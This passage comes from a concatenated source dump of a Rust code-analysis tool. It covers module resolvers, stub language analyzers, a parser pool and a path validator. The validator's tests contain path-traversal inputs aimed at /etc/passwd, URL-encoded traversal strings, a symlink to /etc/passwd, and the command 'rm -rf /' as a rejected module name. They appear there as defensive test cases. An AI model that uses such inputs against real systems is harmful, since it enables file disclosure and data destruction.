    ) -> Result<ResolvedPath, ContextCreatorError> {
        // Validate module name for security
        validate_module_name(module_path)?;

        // Handle standard library imports
        if self.is_external_module(module_path) {
            return Ok(ResolvedPath {
                path: base_dir.join("Cargo.toml"), // Point to Cargo.toml as indicator
                is_external: true,
                confidence: 1.0,
            });
        }

        // Handle crate-relative imports
        if module_path.starts_with("crate::") {
            let relative_path = module_path.strip_prefix("crate::").unwrap();
            let path = ResolverUtils::module_to_path(relative_path);
            let full_path = base_dir.join("src").join(path);

            if let Some(resolved) = ResolverUtils::find_with_extensions(&full_path, &["rs"]) {
                let validated_path = validate_import_path(base_dir, &resolved)?;
                return Ok(ResolvedPath {
                    path: validated_path,
                    is_external: false,
                    confidence: 0.9,
                });
            }

            // Try as a directory module (mod.rs)
            let mod_path = full_path.join("mod.rs");
            if mod_path.exists() {
                let validated_path = validate_import_path(base_dir, &mod_path)?;
                return Ok(ResolvedPath {
                    path: validated_path,
                    is_external: false,
                    confidence: 0.9,
                });
            }
        }

        // Handle relative imports (self, super)
        if module_path.starts_with("self::") || module_path.starts_with("super::") {
            if let Some(resolved) = ResolverUtils::resolve_relative(module_path, from_file, &["rs"])
            {
                return Ok(ResolvedPath {
                    path: resolved,
                    is_external: false,
                    confidence: 0.9,
                });
            }
        }

        // Handle simple module names (e.g., "mod lib;" in same directory)
        if !module_path.contains("::") {
            if let Some(parent) = from_file.parent() {
                // Try as a file
                let file_path = parent.join(format!("{module_path}.rs"));
                if file_path.exists() {
                    let validated_path = validate_import_path(base_dir, &file_path)?;
                    return Ok(ResolvedPath {
                        path: validated_path,
                        is_external: false,
                        confidence: 0.9,
                    });
                }

                // Try as a directory module
                let mod_path = parent.join(module_path).join("mod.rs");
                if mod_path.exists() {
                    let validated_path = validate_import_path(base_dir, &mod_path)?;
                    return Ok(ResolvedPath {
                        path: validated_path,
                        is_external: false,
                        confidence: 0.9,
                    });
                }
            }
        }

        // Otherwise, assume it's an external crate
        Ok(ResolvedPath {
            path: base_dir.join("Cargo.toml"), // Point to Cargo.toml as indicator
            is_external: true,
            confidence: 0.5,
        })
    }

    fn get_file_extensions(&self) -> Vec<&'static str> {
        vec!["rs"]
    }

    fn is_external_module(&self, module_path: &str) -> bool {
        // Common standard library crates
        let stdlib_crates = ["std", "core", "alloc", "proc_macro", "test"];

        // Get the first part of the path (before ::)
        let first_part = module_path.split("::").next().unwrap_or(module_path);

        // Check if it's a standard library crate
        if stdlib_crates.contains(&first_part) {
            return true;
        }

        // Simple module names (no ::) are NOT external - they're local modules
        if !module_path.contains("::") {
            return false;
        }

        // crate::, self::, super:: are always local
        if module_path.starts_with("crate::")
            || module_path.starts_with("self::")
            || module_path.starts_with("super::")
        {
            return false;
        }

        // Other paths with :: might be external crates
        // For now, we'll consider them external unless we have more context
        true
    }
}
```

## src/core/semantic/languages/scala.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, ScalaAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, ScalaAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, ScalaAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Scala

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct ScalaAnalyzer {
    #[allow(dead_code)]
    parser: Parser,
}

impl ScalaAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_scala::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_scala::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for ScalaAnalyzer {
    fn language_name(&self) -> &'static str {
        "Scala"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Scala analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        extension == "scala" || extension == "sc"
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["scala", "sc"]
    }
}
```

## src/core/semantic/languages/swift.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, SwiftAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, SwiftAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, SwiftAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Swift

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct SwiftAnalyzer {
    #[allow(dead_code)]
    parser: Parser,
}

impl SwiftAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_swift::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_swift::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for SwiftAnalyzer {
    fn language_name(&self) -> &'static str {
        "Swift"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Swift analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "swift")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["swift"]
    }
}
```

## src/core/semantic/languages/typescript.rs

Imports: crate, crate::utils::error::ContextCreatorError, std::path::Path, tree_sitter::Parser

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, std::path::Path.Path, tree_sitter::Parser.Parser, TypeScriptAnalyzer, QueryEngine, QueryEngine, TypeScriptAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, TypeScriptAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, AnalysisResult, TypeScriptModuleResolver, ModuleResolver, TypeScriptModuleResolver, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, ResolvedPath, crate::utils::error::ContextCreatorError.ContextCreatorError, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath

```rust
//! Semantic analyzer for TypeScript

use crate::core::semantic::{
    analyzer::{AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult},
    path_validator::{validate_import_path, validate_module_name},
    query_engine::QueryEngine,
    resolver::{ModuleResolver, ResolvedPath},
};
use crate::utils::error::ContextCreatorError;
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct TypeScriptAnalyzer {
    query_engine: QueryEngine,
}

impl TypeScriptAnalyzer {
    pub fn new() -> Self {
        let language = tree_sitter_typescript::language_typescript();
        let query_engine = QueryEngine::new(language, "typescript")
            .expect("Failed to create TypeScript query engine");
        Self { query_engine }
    }
}

impl LanguageAnalyzer for TypeScriptAnalyzer {
    fn language_name(&self) -> &'static str {
        "TypeScript"
    }

    fn analyze_file(
        &self,
        path: &Path,
        content: &str,
        context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        let mut parser = Parser::new();
        parser
            .set_language(tree_sitter_typescript::language_typescript())
            .map_err(|e| ContextCreatorError::ParseError(format!("Failed to set language: {e}")))?;

        let mut result = self
            .query_engine
            .analyze_with_parser(&mut parser, content)?;

        // Resolve type definitions for the type references found
        self.query_engine.resolve_type_definitions(
            &mut result.type_references,
            path,
            &context.base_dir,
        )?;

        Ok(result)
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        extension == "ts" || extension == "tsx"
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["ts", "tsx"]
    }
}

pub struct TypeScriptModuleResolver;

impl ModuleResolver for TypeScriptModuleResolver {
    fn resolve_import(
        &self,
        module_path: &str,
        from_file: &Path,
        base_dir: &Path,
    ) -> Result<ResolvedPath, ContextCreatorError> {
        // Validate module name for security
        validate_module_name(module_path)?;

        // Handle Node.js built-in modules and common packages
        if self.is_external_module(module_path) {
            return Ok(ResolvedPath {
                path: base_dir.join("package.json"), // Point to package.json as indicator
                is_external: true,
                confidence: 1.0,
            });
        }

        // Handle relative imports (./, ../)
        if module_path.starts_with('.') {
            if let Some(parent) = from_file.parent() {
                let resolved_path = parent.join(module_path);

                // Try different extensions (TypeScript first, then JavaScript)
                for ext in &["ts", "tsx", "js", "jsx"] {
                    let with_ext = resolved_path.with_extension(ext);
                    if with_ext.exists() {
                        let validated_path = validate_import_path(base_dir, &with_ext)?;
                        return Ok(ResolvedPath {
                            path: validated_path,
                            is_external: false,
                            confidence: 0.9,
                        });
                    }
                }

                // Try as directory with index file
                for ext in &["ts", "tsx", "js", "jsx"] {
                    let index_path = resolved_path.join(format!("index.{ext}"));
                    if index_path.exists() {
                        let validated_path = validate_import_path(base_dir, &index_path)?;
                        return Ok(ResolvedPath {
                            path: validated_path,
                            is_external: false,
                            confidence: 0.9,
                        });
                    }
                }
            }
        }

        // Handle absolute imports from node_modules or project root
        let search_paths = vec![
            base_dir.to_path_buf(),
            from_file.parent().unwrap_or(base_dir).to_path_buf(),
        ];

        for search_path in &search_paths {
            // Try as a file
            for ext in &["ts", "tsx", "js", "jsx"] {
                let file_path = search_path.join(format!("{module_path}.{ext}"));
                if file_path.exists() {
                    let validated_path = validate_import_path(base_dir, &file_path)?;
                    return Ok(ResolvedPath {
                        path: validated_path,
                        is_external: false,
                        confidence: 0.8,
                    });
                }
            }

            // Try as a directory with index file
            for ext in &["ts", "tsx", "js", "jsx"] {
                let index_path = search_path.join(module_path).join(format!("index.{ext}"));
                if index_path.exists() {
                    let validated_path = validate_import_path(base_dir, &index_path)?;
                    return Ok(ResolvedPath {
                        path: validated_path,
                        is_external: false,
                        confidence: 0.8,
                    });
                }
            }
        }

        // Otherwise, assume it's an external package
        Ok(ResolvedPath {
            path: base_dir.join("package.json"),
            is_external: true,
            confidence: 0.5,
        })
    }

    fn get_file_extensions(&self) -> Vec<&'static str> {
        vec!["ts", "tsx"]
    }

    fn is_external_module(&self, module_path: &str) -> bool {
        // Node.js built-in modules
        let builtin_modules = [
            "assert",
            "buffer",
            "child_process",
            "cluster",
            "crypto",
            "dgram",
            "dns",
            "domain",
            "events",
            "fs",
            "http",
            "https",
            "net",
            "os",
            "path",
            "punycode",
            "querystring",
            "readline",
            "repl",
            "stream",
            "string_decoder",
            "tls",
            "tty",
            "url",
            "util",
            "v8",
            "vm",
            "zlib",
            "process",
            "console",
            "timers",
            "module",
        ];

        // Common npm packages (same as JavaScript + TypeScript specific)
        let common_packages = [
            "react",
            "react-dom",
            "vue",
            "angular",
            "lodash",
            "express",
            "next",
            "webpack",
            "babel",
            "eslint",
            "typescript",
            "jest",
            "mocha",
            "chai",
            "sinon",
            "axios",
            "moment",
            "dayjs",
            "socket.io",
            "cors",
            "helmet",
            "bcrypt",
            "jsonwebtoken",
            "passport",
            "multer",
            "nodemailer",
            "mongoose",
            "sequelize",
            "prisma",
            "graphql",
            "apollo",
            "redux",
            "mobx",
            "zustand",
            "styled-components",
            "emotion",
            "tailwindcss",
            "@types/node",
            "@types/react",
            "@types/express",
            "ts-node",
            "tsx",
            "tsc",
        ];

        let first_part = module_path.split('/').next().unwrap_or("");
        builtin_modules.contains(&first_part) || common_packages.contains(&first_part)
    }
}
```

## src/core/semantic/mod.rs

Imports: analyzer, cache, languages, parser_pool, path_validator, query_engine, resolver, rust_function_call_test, pub use cache::AstCacheV2, javascript_test, python_test, test, pub use analyzer, pub use resolver, crate::utils::error::ContextCreatorError, std::path::Path, config

Type references: pub use cache::AstCacheV2.AstCacheV2, crate::utils::error::ContextCreatorError.ContextCreatorError, std::path::Path.Path, SemanticOptions, SemanticOptions, Config, Self, Self, Self, std::path::Path.Path, std::path::Path.Path, pub use analyzer.LanguageAnalyzer, crate::utils::error::ContextCreatorError.ContextCreatorError, pub use analyzer.LanguageAnalyzer, std::path::Path.Path, std::path::Path.Path, pub use resolver.ModuleResolver, crate::utils::error::ContextCreatorError.ContextCreatorError, pub use resolver.ModuleResolver

```rust
//! Semantic analysis module for context-creator
//!
//! This module provides language-agnostic semantic analysis capabilities including:
//! - Import/dependency tracing
//! - Function call analysis
//! - Type dependency tracking

#![allow(clippy::new_without_default)]

pub mod analyzer;
pub mod cache;
pub mod languages;
pub mod parser_pool;
pub mod path_validator;
pub mod query_engine;
pub mod resolver;

#[cfg(test)]
mod rust_function_call_test;

// Re-export commonly used types
pub use cache::AstCacheV2;

#[cfg(test)]
mod javascript_test;
#[cfg(test)]
mod python_test;
#[cfg(test)]
mod test;

pub use analyzer::{LanguageAnalyzer, SemanticContext, SemanticResult};
pub use resolver::{ModuleResolver, ResolvedPath};

use crate::utils::error::ContextCreatorError;
use std::path::Path;

/// Semantic analysis options
#[derive(Debug, Clone)]
pub struct SemanticOptions {
    /// Enable import tracing
    pub trace_imports: bool,
    /// Include function callers
    pub include_callers: bool,
    /// Include type dependencies
    pub include_types: bool,
    /// Maximum depth for dependency traversal
    pub semantic_depth: usize,
}

impl SemanticOptions {
    /// Create SemanticOptions from CLI config
    pub fn from_config(config: &crate::cli::Config) -> Self {
        Self {
            trace_imports: config.trace_imports,
            include_callers: config.include_callers,
            include_types: config.include_types,
            semantic_depth: config.semantic_depth,
        }
    }

    /// Check if any semantic analysis is enabled
    pub fn is_enabled(&self) -> bool {
        self.trace_imports || self.include_callers || self.include_types
    }
}

/// Get the appropriate language analyzer for a file
pub fn get_analyzer_for_file(
    path: &Path,
) -> Result<Option<Box<dyn LanguageAnalyzer>>, ContextCreatorError> {
    let extension = path.extension().and_then(|ext| ext.to_str()).unwrap_or("");

    let analyzer: Option<Box<dyn LanguageAnalyzer>> = match extension {
        "rs" => Some(Box::new(languages::rust::RustAnalyzer::new())),
        "py" => Some(Box::new(languages::python::PythonAnalyzer::new())),
        "js" | "jsx" => Some(Box::new(languages::javascript::JavaScriptAnalyzer::new())),
        "ts" | "tsx" => Some(Box::new(languages::typescript::TypeScriptAnalyzer::new())),
        "go" => Some(Box::new(languages::go::GoAnalyzer::new())),
        "java" => Some(Box::new(languages::java::JavaAnalyzer::new())),
        "cpp" | "cc" | "cxx" | "hpp" | "h" => Some(Box::new(languages::cpp::CppAnalyzer::new())),
        "c" => Some(Box::new(languages::c::CAnalyzer::new())),
        "cs" => Some(Box::new(languages::csharp::CSharpAnalyzer::new())),
        "rb" => Some(Box::new(languages::ruby::RubyAnalyzer::new())),
        "php" => Some(Box::new(languages::php::PhpAnalyzer::new())),
        "swift" => Some(Box::new(languages::swift::SwiftAnalyzer::new())),
        "kt" | "kts" => Some(Box::new(languages::kotlin::KotlinAnalyzer::new())),
        "scala" | "sc" => Some(Box::new(languages::scala::ScalaAnalyzer::new())),
        "dart" => Some(Box::new(languages::dart::DartAnalyzer::new())),
        "lua" => Some(Box::new(languages::lua::LuaAnalyzer::new())),
        "r" | "R" => Some(Box::new(languages::r::RAnalyzer::new())),
        "jl" => Some(Box::new(languages::julia::JuliaAnalyzer::new())),
        "ex" | "exs" => Some(Box::new(languages::elixir::ElixirAnalyzer::new())),
        "elm" => Some(Box::new(languages::elm::ElmAnalyzer::new())),
        _ => None,
    };

    Ok(analyzer)
}

/// Get the appropriate module resolver for a file
pub fn get_resolver_for_file(
    path: &Path,
) -> Result<Option<Box<dyn ModuleResolver>>, ContextCreatorError> {
    let extension = path.extension().and_then(|ext| ext.to_str()).unwrap_or("");

    let resolver: Option<Box<dyn ModuleResolver>> = match extension {
        "rs" => Some(Box::new(languages::rust::RustModuleResolver)),
        "py" => Some(Box::new(languages::python::PythonModuleResolver)),
        "js" | "jsx" => Some(Box::new(languages::javascript::JavaScriptModuleResolver)),
        "ts" | "tsx" => Some(Box::new(languages::javascript::JavaScriptModuleResolver)), // TypeScript uses same resolution as JS
        _ => None,
    };

    Ok(resolver)
}
```

## src/core/semantic/parser_pool.rs

Imports: crate::utils::error::ContextCreatorError, async_trait::async_trait, deadpool, std::collections::HashMap, tree_sitter, tests, super::*, error

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, async_trait, PooledParser, managed.Object, Object, ParserManager, ParserPool, deadpool.Pool, deadpool.Pool, ParserManager, ParserManager, tree_sitter.Language, tree_sitter.Language, ParserManager, tree_sitter.Language, tree_sitter.Language, Self, Self, Self, deadpool.Manager, ParserManager, Type, tree_sitter.Parser, Error, crate::utils::error::ContextCreatorError.ContextCreatorError, tree_sitter.Parser, Self.Error, Error, tree_sitter.Parser, tree_sitter.Parser, deadpool.Metrics, deadpool.Metrics, deadpool.RecycleResult, deadpool.RecycleResult, deadpool.RecycleResult, Self.Error, Error, ParserPoolManager, ParserPool, ParserPoolManager, Self, Self, managed.PoolConfig, PoolConfig, Self, PooledParser, crate::utils::error::ContextCreatorError.ContextCreatorError, deadpool.Status, Status, Default, ParserPoolManager, Self, Self

```rust
//! Thread-safe parser pool for tree-sitter parsers
//! Manages parser lifecycle and prevents resource exhaustion

use crate::utils::error::ContextCreatorError;
use async_trait::async_trait;
use deadpool::managed::{self, Manager, Metrics, Pool, RecycleResult};
use std::collections::HashMap;
use tree_sitter::{Language, Parser};

/// Type alias for a pooled parser
pub type PooledParser = managed::Object<ParserManager>;

/// Type alias for a parser pool
pub type ParserPool = Pool<ParserManager>;

/// Manager for creating and recycling tree-sitter parsers
pub struct ParserManager {
    language: Language,
    language_name: &'static str,
}

impl ParserManager {
    /// Create a new parser manager for a specific language
    pub fn new(language: Language, language_name: &'static str) -> Self {
        Self {
            language,
            language_name,
        }
    }
}

#[async_trait]
impl Manager for ParserManager {
    type Type = Parser;
    type Error = ContextCreatorError;

    async fn create(&self) -> Result<Parser, Self::Error> {
        let mut parser = Parser::new();

        // Set the language
        parser.set_language(self.language).map_err(|e| {
            ContextCreatorError::ParseError(format!(
                "Failed to set {} language: {}",
                self.language_name, e
            ))
        })?;

        // Set timeout to 5 seconds
        parser.set_timeout_micros(5_000_000);

        Ok(parser)
    }

    async fn recycle(&self, parser: &mut Parser, _: &Metrics) -> RecycleResult<Self::Error> {
        // Reset the parser for reuse
        parser.reset();
        Ok(())
    }
}

/// Manages parser pools for multiple languages
pub struct ParserPoolManager {
    pools: HashMap<&'static str, ParserPool>,
}

impl ParserPoolManager {
    /// Create a new parser pool manager with pools for all supported languages
    pub fn new() -> Self {
        let mut pools = HashMap::new();

        // Create pools for each supported language
        // Each pool has a maximum of 16 parsers
        let pool_config = managed::PoolConfig {
            max_size: 16,
            ..Default::default()
        };

        // Rust
        pools.insert(
            "rust",
            Pool::builder(ParserManager::new(tree_sitter_rust::language(), "rust"))
                .config(pool_config)
                .build()
                .expect("Failed to create Rust parser pool"),
        );

        // JavaScript
        pools.insert(
            "javascript",
            Pool::builder(ParserManager::new(
                tree_sitter_javascript::language(),
                "javascript",
            ))
            .config(pool_config)
            .build()
            .expect("Failed to create JavaScript parser pool"),
        );

        // Python
        pools.insert(
            "python",
            Pool::builder(ParserManager::new(tree_sitter_python::language(), "python"))
                .config(pool_config)
                .build()
                .expect("Failed to create Python parser pool"),
        );

        // TypeScript
        pools.insert(
            "typescript",
            Pool::builder(ParserManager::new(
                tree_sitter_typescript::language_typescript(),
                "typescript",
            ))
            .config(pool_config)
            .build()
            .expect("Failed to create TypeScript parser pool"),
        );

        // Go
        pools.insert(
            "go",
            Pool::builder(ParserManager::new(tree_sitter_go::language(), "go"))
                .config(pool_config)
                .build()
                .expect("Failed to create Go parser pool"),
        );

        // Java
        pools.insert(
            "java",
            Pool::builder(ParserManager::new(tree_sitter_java::language(), "java"))
                .config(pool_config)
                .build()
                .expect("Failed to create Java parser pool"),
        );

        Self { pools }
    }

    /// Get a parser from the pool for the specified language
    pub async fn get_parser(&self, language: &str) -> Result<PooledParser, ContextCreatorError> {
        let pool = self.pools.get(language).ok_or_else(|| {
            ContextCreatorError::ParseError(format!("Unsupported language: {language}"))
        })?;

        pool.get().await.map_err(|e| {
            ContextCreatorError::ParseError(format!(
                "Failed to get {language} parser from pool: {e}"
            ))
        })
    }

    /// Get pool status for monitoring
    pub fn get_status(&self, language: &str) -> Option<deadpool::Status> {
        self.pools.get(language).map(|pool| pool.status())
    }
}

impl Default for ParserPoolManager {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_parser_creation() {
        let manager = ParserManager::new(tree_sitter_rust::language(), "rust");
        let parser = manager.create().await.unwrap();

        // Check timeout is set (tree-sitter returns microseconds as u64, not Option)
        assert_eq!(parser.timeout_micros(), 5_000_000);
    }

    #[tokio::test]
    async fn test_parser_recycling() {
        let manager = ParserManager::new(tree_sitter_python::language(), "python");
        let mut parser = manager.create().await.unwrap();

        // Recycling should succeed
        let result = manager.recycle(&mut parser, &Metrics::default()).await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_pool_manager() {
        let pool_manager = ParserPoolManager::new();

        // Should successfully get parsers
        let rust_parser = pool_manager.get_parser("rust").await;
        assert!(rust_parser.is_ok());

        let python_parser = pool_manager.get_parser("python").await;
        assert!(python_parser.is_ok());

        // Should fail for unsupported language
        let unknown = pool_manager.get_parser("cobol").await;
        assert!(unknown.is_err());
    }
}
```

## src/core/semantic/path_validator.rs

Imports: crate::utils::error::ContextCreatorError, std, tests, super::*, std::fs, tempfile::TempDir, std::os::unix::fs::symlink

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, std.Path, std.Path, std.Path, std.Path, std.PathBuf, crate::utils::error::ContextCreatorError.ContextCreatorError, crate::utils::error::ContextCreatorError.ContextCreatorError, crate::utils::error::ContextCreatorError.ContextCreatorError, fs, tempfile::TempDir.TempDir, symlink

```rust
//! Secure path validation - KISS implementation
//!
//! Security principles:
//! 1. Fail closed - deny by default
//! 2. No TOCTOU - single atomic check
//! 3. Proper URL decoding before validation
//! 4. No manual path resolution

use crate::utils::error::ContextCreatorError;
use std::path::{Path, PathBuf};

/// Validate import path - production-ready, fast, secure
pub fn validate_import_path(
    base_dir: &Path,
    import_path: &Path,
) -> Result<PathBuf, ContextCreatorError> {
    // 1. Base directory must be absolute
    if !base_dir.is_absolute() {
        return Err(ContextCreatorError::SecurityError(
            "Base directory must be absolute".to_string(),
        ));
    }

    // 2. Decode URL encoding BEFORE any path operations
    let path_str = import_path.to_string_lossy();
    let decoded = decode_url_path(&path_str)?;

    // 3. Reject if decoded path differs (indicates encoding was present)
    if decoded != path_str {
        return Err(ContextCreatorError::SecurityError(format!(
            "URL-encoded paths are not allowed: {path_str}"
        )));
    }

    // 4. Convert to PathBuf and normalize slashes
    let normalized = PathBuf::from(decoded.replace('\\', "/"));

    // 5. Build the full path
    let full_path = if normalized.is_absolute() {
        normalized
    } else {
        base_dir.join(normalized)
    };

    // 6. CRITICAL: Only use canonicalize - never fall back to manual resolution
    // If the file doesn't exist, that's a legitimate error, not a security bypass
    let canonical_path = full_path.canonicalize().map_err(|e| {
        ContextCreatorError::InvalidPath(format!(
            "Path does not exist or cannot be resolved: {} ({})",
            full_path.display(),
            e
        ))
    })?;

    let canonical_base = base_dir.canonicalize().map_err(|e| {
        ContextCreatorError::SecurityError(format!("Cannot canonicalize base directory: {e}"))
    })?;

    // 7. Verify the canonical path is within base directory
    if !canonical_path.starts_with(&canonical_base) {
        return Err(ContextCreatorError::SecurityError(format!(
            "Path escapes project directory: {}",
            import_path.display()
        )));
    }

    Ok(canonical_path)
}

/// Validate module name - fast, simple, secure
pub fn validate_module_name(module_name: &str) -> Result<(), ContextCreatorError> {
    // Reject if empty
    if module_name.is_empty() {
        return Err(ContextCreatorError::SecurityError(
            "Module name cannot be empty".to_string(),
        ));
    }

    // Reject if too long (DoS protection)
    if module_name.len() > 255 {
        return Err(ContextCreatorError::SecurityError(
            "Module name too long".to_string(),
        ));
    }

    // Check for null bytes (string termination attacks)
    if module_name.contains('\0') {
        return Err(ContextCreatorError::SecurityError(
            "Module name contains null byte".to_string(),
        ));
    }

    // Simple check for path traversal
    if module_name.contains("..") {
        return Err(ContextCreatorError::SecurityError(format!(
            "Invalid module name: {module_name}"
        )));
    }

    // Allow only safe characters using a fast check
    let valid_chars = module_name.chars().all(|c| {
        c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '@' || c == '/' || c == ':'
        // For scoped packages like @types/node
    });

    if !valid_chars {
        return Err(ContextCreatorError::SecurityError(format!(
            "Module name contains invalid characters: {module_name}"
        )));
    }

    Ok(())
}

/// Decode URL-encoded path - handles all encoding variants
fn decode_url_path(path: &str) -> Result<String, ContextCreatorError> {
    // Fast path - if no % sign, no decoding needed
    if !path.contains('%') {
        return Ok(path.to_string());
    }

    // Use percent_encoding crate for proper decoding
    // For now, simple check for common patterns
    let lower = path.to_lowercase();

    // Check for any hex encoding patterns
    if lower.contains("%2e") || // .
       lower.contains("%2f") || // /
       lower.contains("%5c") || // \
       lower.contains("%00") || // null
       lower.contains("%25") || // % (double encoding)
       lower.contains("%c0") || // UTF-8 overlong
       lower.contains("%e0") || // UTF-8 variants
       lower.contains("%f0") || // UTF-8 variants
       lower.contains("%u00")
    // Unicode encoding
    {
        return Err(ContextCreatorError::SecurityError(
            "URL-encoded characters detected in path".to_string(),
        ));
    }

    Ok(path.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    #[test]
    fn test_valid_paths() {
        let temp_dir = TempDir::new().unwrap();
        let base = temp_dir.path();

        // Create test structure
        fs::create_dir_all(base.join("src")).unwrap();
        fs::write(base.join("src/lib.rs"), "").unwrap();

        // Valid paths should work
        let result = validate_import_path(base, &PathBuf::from("src/lib.rs"));
        assert!(result.is_ok());
    }

    #[test]
    fn test_path_traversal_blocked() {
        let temp_dir = TempDir::new().unwrap();
        let base = temp_dir.path();

        // Create a file to try to escape to
        let target = base.join("target.txt");
        fs::write(&target, "target").unwrap();

        // Try to escape using ../
        let escape_path = base.join("src/../../../etc/passwd");
        let result = validate_import_path(base, &escape_path);
        assert!(result.is_err());
    }

    #[test]
    fn test_url_encoding_blocked() {
        let temp_dir = TempDir::new().unwrap();
        let base = temp_dir.path();

        let encoded_paths = vec![
            "src/%2e%2e/secret",
            "src%2f%2e%2e%2fsecret",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ];

        for path in encoded_paths {
            let result = validate_import_path(base, &PathBuf::from(path));
            assert!(result.is_err(), "Should block: {path}");
        }
    }

    #[test]
    fn test_symlink_blocked() {
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;

            let temp_dir = TempDir::new().unwrap();
            let base = temp_dir.path();
            // Create a symlink to /etc/passwd
            let link_path = base.join("evil_link");
            symlink("/etc/passwd", &link_path).unwrap();

            let result = validate_import_path(base, &link_path);
            assert!(result.is_err());
        }

        #[cfg(not(unix))]
        {
            // Symlink test is Unix-specific
            // Windows symlinks require admin privileges
            // This test only runs on Unix systems
        }
    }

    #[test]
    fn test_nonexistent_file_fails() {
        let temp_dir = TempDir::new().unwrap();
        let base = temp_dir.path();

        // Nonexistent files should fail (fail closed)
        let result = validate_import_path(base, &PathBuf::from("does/not/exist.rs"));
        assert!(result.is_err());
    }

    #[test]
    fn test_module_name_validation() {
        // Valid names
        assert!(validate_module_name("lodash").is_ok());
        assert!(validate_module_name("@angular/core").is_ok());
        assert!(validate_module_name("@types/node").is_ok());

        // Invalid names
        assert!(validate_module_name("").is_err());
        assert!(validate_module_name("../../../etc/passwd").is_err());
        assert!(validate_module_name("name\0with\0null").is_err());
        assert!(validate_module_name(&"a".repeat(256)).is_err());
        assert!(validate_module_name("rm -rf /").is_err());
    }
}
```

## src/core/semantic/query_engine.rs

Imports: crate, crate::utils::error::ContextCreatorError, std::collections::HashMap, tree_sitter, crate::core::semantic::path_validator::validate_import_path, std::fs, tests, super::*

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, QueryEngine, tree_sitter.Language, tree_sitter.Language, tree_sitter.Query, tree_sitter.Query, tree_sitter.Query, tree_sitter.Query, tree_sitter.Query, tree_sitter.Query, QueryEngine, tree_sitter.Language, tree_sitter.Language, Self, crate::utils::error::ContextCreatorError.ContextCreatorError, Self, tree_sitter.Parser, tree_sitter.Parser, crate.AnalysisResult, crate::utils::error::ContextCreatorError.ContextCreatorError, tree_sitter.Tree, tree_sitter.Tree, crate.AnalysisResult, crate::utils::error::ContextCreatorError.ContextCreatorError, tree_sitter.Language, tree_sitter.Language, tree_sitter.Query, crate::utils::error::ContextCreatorError.ContextCreatorError, tree_sitter.Language, tree_sitter.Language, tree_sitter.Query, crate::utils::error::ContextCreatorError.ContextCreatorError, tree_sitter.Language, tree_sitter.Language, tree_sitter.Query, crate::utils::error::ContextCreatorError.ContextCreatorError, tree_sitter.QueryMatches, QueryMatches, crate.Import, crate::utils::error::ContextCreatorError.ContextCreatorError, crate.Import, tree_sitter.QueryMatches, QueryMatches, crate.FunctionCall, crate::utils::error::ContextCreatorError.ContextCreatorError, crate.FunctionCall, tree_sitter.QueryMatches, QueryMatches, crate.TypeReference, crate::utils::error::ContextCreatorError.ContextCreatorError, crate.TypeReference, crate.TypeReference, Path, Path, crate::utils::error::ContextCreatorError.ContextCreatorError, validate_import_path, Path, Path, PathBuf, crate::utils::error::ContextCreatorError.ContextCreatorError, fs, Path, crate::utils::error::ContextCreatorError.ContextCreatorError, Path, tree_sitter.Node, Node, 